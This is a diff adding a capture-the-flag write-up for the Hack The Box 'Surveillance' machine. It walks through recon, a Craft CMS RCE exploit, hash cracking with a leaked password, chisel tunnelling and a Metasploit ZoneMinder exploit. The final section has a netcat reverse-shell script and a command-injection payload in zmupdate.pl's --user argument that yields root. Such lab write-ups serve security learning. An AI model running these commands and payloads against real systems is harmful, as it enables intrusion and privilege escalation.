@@ -438,3 +438,139 @@ access website uploaded file...
 <figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:red;">**PWNED <3**</mark>
+
+## Surveillance
+
+### Reco
+
+#### nmap
+
+`nmap -sVC 10.10.11.245`
+
+* 22 SSH
+* 80 HTTP
+  * add to /etc/hosts
+
+<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+
+#### website
+
+* footer
+  * Craft CMS v4.4.14
+
+#### dirb
+
+dirb http://surveillance.htb/
+
+* /.htaccess
+* /admin
+  * redirect to -> /admin/login
+* /css
+* /fonts
+* /images
+* /img
+  * /index
+  * /index.php
+* /js
+  * /logout
+  * /web.config
+  * /wp-admin
+*
+
+### Weaponisation
+
+#### Craft CMS
+
+* VULN v4.4.14
+  * [https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability](https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability)
+  * **CVE-2023-41892**
+  * critical vuln -> **RCE attacks**
+    * exploit is in the public domain
+    * can be exploited anonymously
+    * high severity and low complexity
+    * For Craft v 4.0.0-4.4.14
+    * RESULT -> malicious code run on the server to steal sensitive data
+  * [https://blog.calif.io/p/craftcms-rce](https://blog.calif.io/p/craftcms-rce)
+
+### Exploitation
+
+#### Exploit
+
+* [https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)
+* nano CVE-2023-41892.py
+  * edit the original code
+    * ...
+
+### User flag
+
+#### Obtain user credentials
+
+* /html/craft/storage/backups
+  *   matthew - bcrypt hash
+
+      * 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
+      * hashcat
+
+      <figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+
+#### SSH
+
+`ssh matthew@10.10.11.245`
+
+* PW: **starcraft122490**
+* `cat user.txt`
+
+### Root flag
+
+#### Path traversal #1 (Matthew -> ZoneMinder)
+
+\
+1\) Port forward 8080 to your machine\
+&#x20;  a) you can use ssh to portforward, but I´m gonna use chisel.\
+&#x20;  [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+\
+&#x20;  b) run chisel server at attacker's machine`./chisel server --port 1337 --reverse --socks5`\
+&#x20;  c) transfer chisel to victim's pc\
+&#x20;     i) host local server at attacker's machine`python -m http.server 8888`      ii) at matthew's ssh session`wget <your ip>:8888/chisel`      iii) still at matthew's ssh allow for execute (sanity check)`chmod +x chisel`      iv) establish connection to your chisel server`./chisel client <your ip>:1337 R:<whatever port you wish to forward here>:127.0.0.1:8080 &`\
+&#x20;  d) open up your browser and access [http://127](http://0.0.0.127/).0.0.1:\<whatever port you forwarded previously at step c-iv> (you should see zoneminder cms)\
+\
+2\) launch msfconsole\
+`msfconsole`
+
+3\) use the exploit\
+`use exploit/unix/webapp/zoneminder_snapshots`
+
+4\) set victim's ip -> in this case it would be the machine's ip\
+`set RHOSTS <victim ip>`
+
+5\) set victim's port -> in this case it will be port you forwarded in step 1 above\
+`set RPORT <victim port>`
+
+6\) set attacker's ip -> this means your ip\
+`set LHOST <your ip>`
+
+7\) set the target path -> in this case it's just /\
+`set TARGETURI /`
+
+8\) literally just type exploit \
+`exploit`
+
+9\) meterpreter session will be established here get a shell\
+`shell`\
+
+
+#### Path Travesral #2 (zoneminder -> root)
+
+1\) rev.sh file (place this at /tmp) :\
+`#!/bin/bash`\
+`busybox nc 10.10.xx.xx 443 -e sh`
+
+\
+2\) open a listener at port 443\
+\
+3\) run this as zoneminder user\
+`sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword2023`
+
+`cd /root && cat root.txt`
+
+<mark style="color:red;">**PWNED <3**</mark>\
